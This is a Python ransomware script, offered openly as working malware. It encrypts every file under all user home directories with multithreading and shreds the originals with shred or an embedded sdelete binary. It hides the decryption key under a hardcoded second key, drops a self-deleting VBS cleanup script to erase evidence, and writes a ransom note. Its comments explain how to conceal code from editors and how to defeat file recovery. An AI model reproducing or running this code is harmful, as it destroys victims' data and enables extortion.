import os, base64, psutil, subprocess
import threading, platform
from cryptography.fernet import Fernet


WINDOWS_MODE = False
LINUX_MODE = False


#---DETERMINING USER OS---
user_platform = platform.platform().lower()
if "windows" in user_platform:
    WINDOWS_MODE = True
elif "linux" in user_platform: #NOTE: If the OS linux, the script most likely needs to be executed as sudo for it to work properly
    LINUX_MODE = True
else:
    pick_os = input("The user OS was not found. Do you want to proceed as linux? (Y/N)")
    if pick_os.lower()=='y':
        LINUX_MODE = True
    elif pick_os.lower=='n':
        print("Exiting Program...")
    else:
        print("Invalid choice")

#Binary content in base64 of sdeleter to completely delete original files
#Sdeleter is used because it secure deletes the file, meaning the orignal file cannot be retrived using tools, or at least, it's harder
if (WINDOWS_MODE):
    for i in range(1):  #Inside for i in range(1) because most text editors and IDE allow to hide content of loops
        deleted_exec = b''
    with open('deleter.exe' , 'wb') as file: #Create a deleter.exe
        file.write(base64.b64decode(deleted_exec)) #Write the binary content decoded

#Path to users so it can encrypt all the files of all the users depending on the OS
if (WINDOWS_MODE):
    directory = "C:\\Users\\"
elif (LINUX_MODE):
    directory = "/home/"
key = Fernet.generate_key() #Generate an encryption key
main_key=Fernet(key) #Initiate fernet object with the key

#Function to iterate throught directories, by default it will be the home directory
def iterate_directory(directory):
    try:
        for file in os.listdir(directory): #Iterate through all the files and folders in the directory
            filepath = os.path.join(directory, file) #Get the absolute path to the file

            if (os.path.exists(filepath) and ('deleter.exe' not in filepath)): #Check if the absolute path exists, in order to prevent some errors, deleter.exe is an exception so it does not get encrypted
                if os.path.isfile(filepath): #Check if the absolute path leads to a file
                    encrypt_file(filepath) #If it is a file, encrypt it

                elif os.path.isdir(filepath): #Check if the absolute path leads to a directory instead
                    iterate_directory(filepath) #If the object is a directory, resursive call the function to iterate throught it

                else:
                    print("Error while dealing with " + filepath) #If the absolute path does not lead to a file or directory, skip it, sometimes happen with files behind admin access or links
            else:
                print('Could not work with ' + filepath) #If the path does not exists or is deleter.exe, skip it

    except Exception as e: #If an exception occurs anywhere while handling the absolute path, file or directory
        print("Exception: ", e) #Show the exception

#Function to encrypt a file given its absolute path
def encrypt_file(filepath): 
    print("Encrypting: " + filepath) #Optional print statement to indicate which file is being encrypted
    with open(filepath, 'rb') as file: #Open the file in read binary mode
        binarycontent = file.read() #Get the binary content of the file

    encryptedbinarycontent = main_key.encrypt(binarycontent) #Encrypt the binary content using the key generated at the start
    if (WINDOWS_MODE):
        command = 'deleter.exe "{}"'.format(filepath) #The command needed to secure delete the file
        subprocess.call(command, stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT) #Calling the command to delete the original 
    if (LINUX_MODE):
        command = 'shred -uz "{}"'.format(filepath) #The command needed to secure delete the file using shred
        os.system(command) #Calling the command to delete the original finle

    with open(filepath, 'wb') as file: #Open a file, using the absolute path, in write binary mode; create a file that replaces the original
        file.write(encryptedbinarycontent) #Write on the file the encrypted content of the original

#----ENCRYPTING USER FILES---
directory_list = []
thread_list = []

for user in os.listdir(directory): #Get all the users in the C:\\Users\\ directory
    #print("User: ", user, "\n","Path: ", os.path.join(directory, user)) #Optional print statement to show the user and the path being encrypted
    user_directory = os.path.join(directory, user) #Get the path of each user
    directory_list.append(user_directory) #Append the paths to directory_list

for user_directory in directory_list: 
    new_thread = threading.Thread(target=iterate_directory, args=(user_directory,)) #For each user path, create a new thread that targets said path
    thread_list.append(new_thread) #Append each thread to thread_list

#Starting each thread
for thread in thread_list: 
    thread.start()

#Joining each thread
for thread in thread_list:
    thread.join()


#The following process uses a Second Key to encrypt the original key before saving it,
#This way, when the key.key file is created, it cannot be used, even if the victim finds it
#This is the default second key but it is recommended that another one is generated
f2 = Fernet(b'tifk8qG4WC8y5R4N1iYtuuVzll0Le-dEorZKknJreMY=') #Second key
with open('key.key', 'wb') as file: #Open a key file in write binary content
    file.write(f2.encrypt(key)) #Write the encrypted main key unto the file

#The following process creates a .vbs file that will run without creating shell, therefore being hidden
#The .vbs file will stop the script if it's running, use the sdelete tool (here called deleter.exe) to safely remove the script
#therefore, the evidence of the script is completely removed.
#After, it deletes deleter.exe, and finally deletes itself.
if (WINDOWS_MODE):
    with open("finisher.vbs", "w") as file: #Open the vbs file
        script = '''Set oShell = WScript.CreateObject ("WScript.Shell")
    oShell.run "taskkill /f /iM python.exe",0,True
    oShell.run "deleter.exe encrypt.py",0,True
    dim filesys
    Set filesys = CreateObject("Scripting.FileSystemObject")
    filesys.DeleteFile "deleter.exe"
    Set oFso = CreateObject("Scripting.FileSystemObject") : oFso.DeleteFile Wscript.ScriptFullName, True'''
        file.write(script) #Write the code that the .vbs file will use

#Finally, create a README.txt files with a more unique name in order to make it clear that it should be read to obtain the files back
#The instructions can be cuztomized depending on the person executing it
with open('READMETOGETFILES.txt' , 'w') as file:  #Create and open the READMETOGETFILES.txt file
    #Instructions to get files back
    instructions = '''ALL YOUR FILES HAVE BEEN ENCRYPTED!
    TO RESTORE THEM YOU NEED A SPECIAL KEY
    OTHERWISE, YOUR FILES WILL NEVER RETURN
    IT IS POSSIBLE, ALTHOUGH UNLIKELY, THAT SOME FILES STAY BROKEN AFTER DECRYPTING
    AND THIS COULD LEAD TO THE MACHINE NOT WORKING WELL IN SOME CASES
    THEREFORE, IT IS ADVISED THAT ONCE THE FILES ARE DECRYPTED, SAVE THEM AND MAKE
    A FRESH INSTALLATION
    
    TO GET YOUR FILES BACK DOS THE FOLLOWING:

    '''
    file.write(instructions) #Write the instructions on the file

if (WINDOWS_MODE):
    os.system("finisher.vbs 1") #Executed finisher.vbs, which will safely delete the script, delete deleter.exe and delete itself

